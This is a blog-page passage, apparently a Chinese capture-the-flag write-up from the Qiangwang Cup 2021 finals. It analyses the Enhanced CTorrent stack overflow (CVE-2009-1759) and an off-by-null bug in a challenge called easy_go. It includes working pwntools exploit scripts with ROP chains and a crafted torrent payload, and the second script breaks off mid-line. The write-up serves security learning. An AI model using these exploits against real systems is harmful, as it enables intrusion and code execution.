@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="菜鸡被大佬带着进了线下。还好稍微有一丁点输出。只能做出这两题，说到底，还是太菜了，继续努力吧。。。 ctorrentmain函数里有&quot;Enhanced CTorrent&quot;, &quot;dnh3.3.1&quot;， 我们可以搜到源码。题目就是实现了一个解析torrent文件的工具。 bencode是bittorrent用在传输数据结构的编码方式，即.torrent中存储的数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2021线下">
+<meta property="og:url" content="https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/index.html">
+<meta property="og:site_name" content="多喝咖啡的茶水铺">
+<meta property="og:description" content="菜鸡被大佬带着进了线下。还好稍微有一丁点输出。只能做出这两题，说到底，还是太菜了，继续努力吧。。。 ctorrentmain函数里有&quot;Enhanced CTorrent&quot;, &quot;dnh3.3.1&quot;， 我们可以搜到源码。题目就是实现了一个解析torrent文件的工具。 bencode是bittorrent用在传输数据结构的编码方式，即.torrent中存储的数据">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-07-16T07:10:48.000Z">
+<meta property="article:modified_time" content="2021-07-16T16:09:51.968Z">
+<meta property="article:author" content="多喝咖啡">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+        
+      
+    
+    <!-- title -->
+    <title>强网杯2021线下</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/06/23/%E9%9B%B6%E9%9B%B6%E7%A2%8E%E7%A2%8Etricks/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&text=强网杯2021线下"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&is_video=false&description=强网杯2021线下"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2021线下&body=Check out this article: https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&name=强网杯2021线下&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&t=强网杯2021线下"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctorrent"><span class="toc-number">1.</span> <span class="toc-text">ctorrent</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bencode"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">bencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bittorrent-protocol"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">bittorrent protocol</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-go"><span class="toc-number">2.</span> <span class="toc-text">easy_go</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        强网杯2021线下
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">多喝咖啡</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T07:10:48.000Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>菜鸡被大佬带着进了线下。还好稍微有一丁点输出。只能做出这两题，说到底，还是太菜了，继续努力吧。。。</p>
+<h1 id="ctorrent"><a href="#ctorrent" class="headerlink" title="ctorrent"></a>ctorrent</h1><p>main函数里有<code>&quot;Enhanced CTorrent&quot;, &quot;dnh3.3.1&quot;</code>， 我们可以搜到源码。题目就是实现了一个解析torrent文件的工具。</p>
+<h4 id="bencode"><a href="#bencode" class="headerlink" title="bencode"></a>bencode</h4><p>是bittorrent用在传输数据结构的编码方式，即<code>.torrent</code>中存储的数据就是用beconde编码的，这种编码方式支持四种数据类型：字符串、整数、列表、字典。</p>
+<ul>
+<li>字符串：例如spam，<code>4:spam</code></li>
+<li>整数：如42，<code>i42e</code></li>
+<li>列表：例如，包括spam和42的列表，<code>l4:spami42ee</code></li>
+<li>字典：例如，<code>&#123;&quot;bar&quot;: &quot;spam&quot;, &quot;foo&quot;: 42&#125;</code> ，<code>d3:bar4:spam3:fooi42ee</code></li>
+</ul>
+<h4 id="bittorrent-protocol"><a href="#bittorrent-protocol" class="headerlink" title="bittorrent protocol"></a>bittorrent protocol</h4><blockquote>
+<ul>
+<li><code>announce</code> - <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Tracker">tracker</a>的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/URL">URL</a></li>
+<li>info -该条映射到一个字典，该字典的键将取决于共享的一个或多个文件：<ul>
+<li><code>name</code> - 建议保存到的文件和目录名称</li>
+<li><code>piece length</code> - 每个文件块的字节数。</li>
+<li><code>pieces</code> - 每个文件块的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SHA-1">SHA-1</a>的集成Hash。因为SHA-1会返回160-bit的Hash，所以<code>pieces</code>将会得到1个160-bit的整数倍的字符串。和一个<code>length</code>（相当于只有一个文件正在共享）或<code>files</code>（相当于当多个文件被共享）：</li>
+<li><code>length</code> - 文件的大小（以字节为单位）</li>
+<li>files - 一个字典的列表（每个字典对应一个文件）与以下的键：<ul>
+<li><code>path</code> - 一个对应子目录名的字符串列表，最后一项是实际的文件名称</li>
+<li><code>length</code> - 文件的大小（以字节为单位）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>自己摸索了有点久，后面才发现可以直接去搜”ctorrent vulnerability”或者”ctorrent cve”之类的东西…就能直接找到CVE-2009-1759。</p>
+<blockquote>
+<p>Stack-based buffer overflow in the btFiles::BuildFromMI function (trunk/btfiles.cpp) in Enhanced CTorrent (aka dTorrent) 3.3.2 and probably earlier, and CTorrent 1.3.4, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a Torrent file containing a long path.</p>
+</blockquote>
+<p>即<code>btfiles.cpp</code>中的<code>btFiles::BuildFromMI</code>会造成栈溢出。然后再搜索相应的patch，发现问题出现在<code>decode_list2path</code>函数中。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-size_t decode_list2path(const char *b, size_t n, char *pathname)</span></span><br><span class="line"><span class="addition">+size_t decode_list2path(const char *b, size_t n, char *pathname, size_t maxlen)</span></span><br><span class="line"> &#123;</span><br><span class="line">   const char *pb = b;</span><br><span class="line">   const char *s = (char *) 0;</span><br><span class="line"><span class="addition">+  const char *endmax = pathname + maxlen - 1;</span></span><br><span class="line">   size_t r,q;</span><br><span class="line"> </span><br><span class="line">   if( &#x27;l&#x27; != *pb ) return 0;</span><br><span class="line">   pb++;</span><br><span class="line">   n--;</span><br><span class="line">   if( !n ) return 0;</span><br><span class="line"><span class="deletion">-  for(; n;)&#123;</span></span><br><span class="line"><span class="addition">+  while( n &amp;&amp; pathname &lt; endmax )&#123;</span></span><br><span class="line">     if(!(r = buf_str(pb, n, &amp;s, &amp;q)) ) return 0;</span><br><span class="line"><span class="addition">+    if( q &gt;= maxlen ) return 0;</span></span><br><span class="line">     memcpy(pathname, s, q);</span><br><span class="line">     pathname += q;</span><br><span class="line"><span class="deletion">-    pb += r; n -= r; </span></span><br><span class="line"><span class="deletion">-    if( &#x27;e&#x27; != *pb )&#123;*pathname = PATH_SP, pathname++;&#125; else break;</span></span><br><span class="line"><span class="addition">+    maxlen -= q;</span></span><br><span class="line"><span class="addition">+    pb += r;</span></span><br><span class="line"><span class="addition">+    n -= r; </span></span><br><span class="line"><span class="addition">+    if( &#x27;e&#x27; == *pb ) break;</span></span><br><span class="line"><span class="addition">+    if( pathname &gt;= endmax ) return 0;</span></span><br><span class="line"><span class="addition">+    *pathname++ = PATH_SP;</span></span><br><span class="line">   &#125;</span><br><span class="line">   *pathname = &#x27;\0&#x27;;</span><br><span class="line">   return (pb - b + 1);</span><br><span class="line"><span class="comment">Index: btfiles.cpp</span></span><br><span class="line"><span class="comment">===================================================================</span></span><br><span class="line"><span class="comment">--- btfiles.cpp	(revision 301)</span></span><br><span class="line"><span class="comment">+++ btfiles.cpp	(revision 302)</span></span><br><span class="line"><span class="meta">@@ -471,6 +471,8 @@</span></span><br><span class="line">     BTFILE *pbf_last = (BTFILE*) 0; </span><br><span class="line">     BTFILE *pbf = (BTFILE*) 0;</span><br><span class="line">     size_t dl;</span><br><span class="line"><span class="addition">+    unsigned long nfiles = 0;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if( decode_query(metabuf,metabuf_len,&quot;info|length&quot;,</span><br><span class="line">                     (const char**) 0,(size_t*) 0,(int64_t*) 0,QUERY_LONG) )</span><br><span class="line">       return -1;</span><br><span class="line"><span class="meta">@@ -524,12 +526,18 @@</span></span><br><span class="line"> #ifndef WINDOWS</span><br><span class="line">       if( !pbf ) return -1;</span><br><span class="line"> #endif</span><br><span class="line"><span class="addition">+      nfiles++;</span></span><br><span class="line">       pbf-&gt;bf_length = t;</span><br><span class="line">       m_total_files_length += t;</span><br><span class="line">       r = decode_query(p, dl, &quot;path&quot;, (const char **)0, &amp;n, (int64_t*)0,</span><br><span class="line">                        QUERY_POS);</span><br><span class="line"><span class="deletion">-      if( !r ) return -1;</span></span><br><span class="line"><span class="deletion">-      if(!decode_list2path(p + r, n, path)) return -1;</span></span><br><span class="line"><span class="addition">+      if( !r || !decode_list2path(p + r, n, path, sizeof(path)) )&#123;</span></span><br><span class="line"><span class="addition">+        CONSOLE.Warning(1,</span></span><br><span class="line"><span class="addition">+          &quot;error, invalid path in torrent data for file %lu at offset %llu&quot;,</span></span><br><span class="line"><span class="addition">+          nfiles, m_total_files_length - t);</span></span><br><span class="line"><span class="addition">+        delete pbf;</span></span><br><span class="line"><span class="addition">+        return -1;</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line"> </span><br><span class="line">       int f_conv;</span><br><span class="line">       char *tmpfn = new char[strlen(path)*2+5];</span><br></pre></td></tr></table></figure>
+
+<p>patch之前的<code>decode_list2path()</code>如下。<code>pathname</code>来自于调用者<code>BuildFromMI()</code>，其长度只有1024个字节。而在<code> memcpy(pathname, s, q)</code>的时候，没有进行长度的检查。于是会造成调用者的栈溢出。只要在构造<code>files</code>这个列表时，让<code>path</code>的长度足够溢出就行。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">btFiles::BuildFromMI</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *metabuf, <span class="keyword">const</span> <span class="keyword">size_t</span> metabuf_len, <span class="keyword">const</span> <span class="keyword">char</span> *saveas)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> path[MAXPATHLEN]; <span class="comment">//MAXPATHLEN = 1024</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">decode_list2path</span>(p + r, n, path)) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">//..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">decode_list2path</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *b, <span class="keyword">size_t</span> n, <span class="keyword">char</span> *pathname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *pb = b;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">char</span> *) <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> r,q;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>( <span class="string">&#x27;l&#x27;</span> != *pb ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  pb++;</span><br><span class="line">  n--;</span><br><span class="line">  <span class="keyword">if</span>( !n ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(; n;)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(r = <span class="built_in">buf_str</span>(pb, n, &amp;s, &amp;q)) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(pathname, s, q);</span><br><span class="line">    pathname += q;</span><br><span class="line">    pb += r; n -= r; </span><br><span class="line">    <span class="keyword">if</span>( <span class="string">&#x27;e&#x27;</span> != *pb )&#123;*pathname = PATH_SP, pathname++;&#125; <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *pathname = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> (pb - b + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">buf_str</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *b,<span class="keyword">size_t</span> len,<span class="keyword">const</span> <span class="keyword">char</span> **pstr,<span class="keyword">size_t</span>* slen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> rl,sl;</span><br><span class="line"></span><br><span class="line">  rl = <span class="built_in">buf_int</span>(b,len,<span class="number">0</span>,<span class="string">&#x27;:&#x27;</span>,&amp;sl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>( !rl ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(len &lt; rl + sl) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(pstr) *pstr = b + rl;</span><br><span class="line">  <span class="keyword">if</span>(slen) *slen = sl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>( rl + sl );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没开沙箱，没有PIE，可以直接改got表。exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">program_name = <span class="string">&#x27;ctorrent&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;./&#x27;</span> + program_name</span><br><span class="line">io = process(<span class="string">&#x27;./&#x27;</span>+program_name)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span>+program_name,checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec = <span class="literal">False</span>) <span class="comment">#2.31</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;--window&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x40A2D8  \n&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000402c7e</span></span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.write(<span class="number">1</span>, <span class="number">0x42E048</span>)</span><br><span class="line">rop.read(<span class="number">0</span>, <span class="number">0x42E048</span>)</span><br><span class="line">rop.sprintf()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>,<span class="string">&quot;7000&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;d8:announce30:http://localhost:6969/announce4:infod4:name9:hello.txt12:piece lengthi32768e&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;6:pieces20:aaaaaaaaaaaaaaaaaaaa5:filesld6:lengthi50e4:pathl4400:&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">4112</span>) <span class="comment">#4152</span></span><br><span class="line">payload += p64(<span class="number">0</span>) *<span class="number">5</span></span><br><span class="line"></span><br><span class="line">payload += rop.chain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">4400</span>+<span class="number">154</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;eeeee&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ffa0</span> -<span class="number">0x25000</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c7e</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h1><p>输入16个字节时，会造成栈的一字节off by null，可以将rbp的最低位置0。如果aslr碰撞到了，在调用者函数返回时，会让rbp的值为输入的前个8字节，返回地址为后8个字节。此时，rdi的值为栈上的值，并且rsi非常大。我们可以返回到myread函数，然后向栈上写内容。我们可以控制myread函数的返回地址，然后就可以开始row了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401685                 mov     esi, 10h</span><br><span class="line">.text:000000000040168A                 mov     rdi, rax</span><br><span class="line">.text:000000000040168D                 call    myread</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">program_name = <span class="string">&#x27;easy_go&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;./&#x27;</span> + program_name</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span>+program_name,checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec = <span class="literal">False</span>) <span class="comment">#2.31</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">leak = <span 